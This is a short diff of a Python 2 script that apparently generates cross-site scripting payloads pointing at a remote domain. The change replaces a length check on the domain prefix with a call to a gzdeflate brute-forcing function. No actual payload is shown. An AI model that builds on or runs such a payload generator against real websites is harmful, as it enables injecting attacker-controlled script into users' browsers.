@@ -38,12 +38,8 @@ if __name__ == '__main__':
 		else:
 			print "[+]XSS Method Requires remote-domain"
 			sys.exit(0)
-		#If Domain larger than 3 chars
-		if len(prefix) > 3:
-			print "Domains larger than 3 chars not supported yet!"
-		#Check possible bruteforce methods
-		else:
-			gzdeflatePayload = calcBruteMethod(remoteDomain, prefix, tld)
+		#Bruteforce gzdeflate payload
+		gzdeflatePayload = gzdeflateBrute(remoteDomain, prefix, tld)
 		#If failed, quit
 		if not gzdeflatePayload:
 			print "[+] Payload Failed to Generate...exiting"
